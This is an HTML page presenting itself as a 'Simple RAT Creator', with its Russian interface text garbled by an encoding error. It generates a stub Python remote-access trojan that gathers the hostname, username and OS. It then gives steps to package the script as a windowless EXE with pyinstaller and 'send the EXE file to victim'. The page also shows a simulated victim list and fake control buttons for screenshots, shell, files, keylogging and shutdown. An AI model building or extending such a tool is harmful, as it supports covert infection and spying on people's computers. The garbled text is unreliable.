<!DOCTYPE html>
<html>
<head>

    <style>

        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üêÄ Simple RAT Creator</h1>
        
        <h3>‚öôÔ∏è –°–æ–∑–¥–∞—Ç—å RAT</h3>
        <input type="text" id="filename" value="setup.exe" placeholder="–ò–º—è —Ñ–∞–π–ª–∞">
        <input type="text" id="creator" value="Admin" placeholder="–í–∞—à–µ –∏–º—è">
        
        <button onclick="downloadRat()">‚¨áÔ∏è –°–ö–ê–ß–ê–¢–¨ RAT.EXE</button>
        
        <h3>üë• –ñ–µ—Ä—Ç–≤—ã (–¥–µ–º–æ)</h3>
        <div id="victims"></div>
        
        <h3>üéÆ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ</h3>
        <button onclick="sendCommand('screenshot')">üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç</button>
        <button onclick="sendCommand('cmd')">üíª –ö–æ–º–∞–Ω–¥–Ω–∞—è —Å—Ç—Ä–æ–∫–∞</button>
        <button onclick="sendCommand('files')">üìÅ –§–∞–π–ª—ã</button>
        <button onclick="sendCommand('keys')">‚å®Ô∏è –ö–µ–π–ª–æ–≥–≥–µ—Ä</button>
        <button style="background: #f44336;" onclick="sendCommand('shutdown')">üîå –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö</button>
        
        <h3>üìä –õ–æ–≥–∏</h3>
        <div class="log" id="log">
[–°–∏—Å—Ç–µ–º–∞] –ì–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ<br>
[–ò–Ω—Ñ–æ] –ù–∞–∂–º–∏—Ç–µ "–°–ö–ê–ß–ê–¢–¨ RAT.EXE"<br>
        </div>
    </div>

    <script>
        let victims = [];
        
        function log(msg) {
            const logDiv = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            logDiv.innerHTML += `[${time}] ${msg}<br>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        function downloadRat() {
            const filename = document.getElementById('filename').value || 'rat.exe';
            const creator = document.getElementById('creator').value || 'Unknown';
            
            // –°–æ–∑–¥–∞–µ–º –ø—Ä–æ—Å—Ç–æ–π Python RAT –∫–æ–¥
            const pythonCode = `# RAT by ${creator}
import os
import platform
import json
import time
from datetime import datetime

print("RAT started on:", platform.node())

# –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
info = {
    "id": platform.node() + "_" + os.getlogin(),
    "os": platform.system(),
    "user": os.getlogin(),
    "time": str(datetime.now()),
    "creator": "${creator}"
}

# –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª (–≤ —Ä–µ–∞–ª—å–Ω–æ–º RAT –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä)
with open("rat_info.txt", "w") as f:
    f.write(json.dumps(info))

print("Info saved to rat_info.txt")

# –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª
while True:
    time.sleep(60)
    print("Still running...")`;
            
            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ Base64
            const base64Code = btoa(pythonCode);
            
            // –°–æ–∑–¥–∞–µ–º HTML —Ñ–∞–π–ª —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π
            const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <title>RAT File</title>
</head>
<body style="font-family: Arial; padding: 20px;">
    <h1>RAT File Instructions</h1>
    <p>1. Copy this code:</p>
    <textarea rows="10" style="width:100%;">${pythonCode}</textarea>
    
    <p>2. Save as <strong>${filename.replace('.exe', '.py')}</strong></p>
    <p>3. Convert to EXE:</p>
    <pre>
pip install pyinstaller
pyinstaller --onefile --noconsole rat.py
    </pre>
    
    <p>4. Send the EXE file to victim</p>
    
    <button onclick="location.reload()">üîÑ Refresh for new victim</button>
</body>
</html>`;
            
            // –°–æ–∑–¥–∞–µ–º –∏ —Å–∫–∞—á–∏–≤–∞–µ–º HTML —Ñ–∞–π–ª
            const blob = new Blob([htmlContent], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'rat_instructions.html';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            log(`‚úÖ RAT —Å–æ–∑–¥–∞–Ω! –°–∫–∞—á–∞–π—Ç–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏`);
            log(`üìÅ –§–∞–π–ª: ${filename}`);
            log(`üë§ –°–æ–∑–¥–∞—Ç–µ–ª—å: ${creator}`);
            
            // –î–æ–±–∞–≤–ª—è–µ–º –¥–µ–º–æ-–∂–µ—Ä—Ç–≤—É —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
            setTimeout(addDemoVictim, 2000);
        }
        
        function addDemoVictim() {
            const victimId = 'PC-' + Math.random().toString(36).substr(2, 6).toUpperCase();
            const user = ['–ê–ª–µ–∫—Å–µ–π', '–ú–∞—Ä–∏—è', '–ò–≤–∞–Ω', '–û–ª—å–≥–∞'][Math.floor(Math.random()*4)];
            const os = ['Windows 10', 'Windows 11', 'Windows 7'][Math.floor(Math.random()*3)];
            
            victims.push({ id: victimId, user: user, os: os });
            
            const victimDiv = document.createElement('div');
            victimDiv.className = 'victim';
            victimDiv.innerHTML = `<strong>${victimId}</strong> | üë§ ${user} | üíª ${os}`;
            document.getElementById('victims').appendChild(victimDiv);
            
            log(`üéØ –ù–æ–≤–∞—è –∂–µ—Ä—Ç–≤–∞: ${victimId}`);
        }
        
        function sendCommand(cmd) {
            if (victims.length === 0) {
                log('‚ùå –ù–µ—Ç –∂–µ—Ä—Ç–≤. –°–Ω–∞—á–∞–ª–∞ —Å–æ–∑–¥–∞–π—Ç–µ RAT');
                return;
            }
            
            const victim = victims[victims.length-1];
            const commands = {
                'screenshot': '–°–∫—Ä–∏–Ω—à–æ—Ç —Å–¥–µ–ª–∞–Ω',
                'cmd': '–ö–æ–º–∞–Ω–¥–Ω–∞—è —Å—Ç—Ä–æ–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∞',
                'files': '–§–∞–π–ª—ã –ø–æ–ª—É—á–µ–Ω—ã',
                'keys': '–ö–µ–π–ª–æ–≥–≥–µ—Ä –∑–∞–ø—É—â–µ–Ω',
                'shutdown': '–ü–ö –≤—ã–∫–ª—é—á–µ–Ω'
            };
            
            log(`üì° ${victim.id}: ${commands[cmd]}`);
        }
        
        // –ê–≤—Ç–æ-–¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –¥–µ–º–æ-–∂–µ—Ä—Ç–≤ –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥
        setInterval(() => {
            if (victims.length < 5 && Math.random() > 0.5) {
                addDemoVictim();
            }
        }, 10000);
        
        log('‚úÖ –°–∏—Å—Ç–µ–º–∞ –≥–æ—Ç–æ–≤–∞');
    </script>
</body>
</html>
